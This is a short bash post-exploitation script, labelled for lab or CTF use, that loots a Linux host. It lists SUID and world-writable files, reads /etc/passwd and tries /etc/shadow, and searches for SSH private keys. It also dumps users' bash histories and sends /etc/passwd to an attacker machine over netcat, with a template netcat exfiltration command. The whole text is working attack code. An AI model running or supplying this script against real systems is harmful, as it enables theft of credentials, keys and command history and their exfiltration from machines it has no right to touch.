#!/bin/bash

# === Permission & File Looting Script ===
# For post-exploitation in a lab or CTF

echo "[*] Enumerating interesting files and permissions..."

# List SUID files (privilege escalation targets)
echo "[+] SUID Binaries:"
find / -type f -perm -04000 2>/dev/null

# List world-writable files
echo "[+] World-Writable Files:"
find / -type f -perm -0002 2>/dev/null

# Show /etc/passwd and shadow if possible
echo "[+] /etc/passwd content:"
cat /etc/passwd

echo "[+] Attempting to read /etc/shadow (requires root):"
cat /etc/shadow 2>/dev/null || echo "Permission denied"

# Check for SSH keys
echo "[+] Searching for SSH private keys:"
find / -name "id_rsa" 2>/dev/null

# Check for .bash_history (command history)
echo "[+] User bash histories:"
find /home /root -name ".bash_history" -exec cat {} \; 2>/dev/null

# Set up Netcat upload if IP and port are given
if [[ "$1" != "" && "$2" != "" ]]; then
    echo "[+] Sending /etc/passwd to attacker machine ($1:$2)..."
    nc $1 $2 < /etc/passwd
else
    echo "[*] To send a file back via netcat, use:"
    echo "    nc <attacker-ip> <port> < /etc/passwd"
fi

echo "[*] Done."
